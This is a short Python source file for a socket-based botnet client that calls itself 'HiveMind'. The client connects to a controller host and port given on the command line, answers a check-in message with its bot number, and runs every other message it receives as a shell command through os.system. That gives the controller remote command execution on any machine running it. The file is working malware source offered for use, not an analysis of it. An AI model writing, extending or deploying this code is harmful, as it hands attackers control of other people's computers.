import socket
import random
from threading import Thread
import os
import argparse
import sys


parser = argparse.ArgumentParser(
    description="HiveMind, python bot net using sockets."
)

parser.add_argument("host", nargs="?", help="Address of the Server.")

parser.add_argument(
    "-p", "--port", default=5000, help="Port the Server is running on.", type=int
)

parser.add_argument(
    "-b",
    dest="bot",
    default="vers",
    type=str,
    help="The bot number this is.",
)

args = parser.parse_args()


if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.host:
    print("Host required! \n")
    parser.print_help()
    sys.exit(1)


s = socket.socket()
s.connect((args.host, args.port))
print("[+] Connected.")


bot_number = args.bot


def listen_for_messages():
    while True:
        message = s.recv(1024).decode()
        if "!connected!" in message:
            connected_bots = f"bot-{bot_number}: connected \n"
            s.send(connected_bots.encode())
        else:
            os.system(f"{message}")


t = Thread(target=listen_for_messages)
t.daemon = True
t.start()



while True:
    to_send =  input()
    if to_send.lower() == 'q':
        break
    to_send = f"bot-{bot_number}: {to_send}"
    s.send(to_send.encode())


s.close()



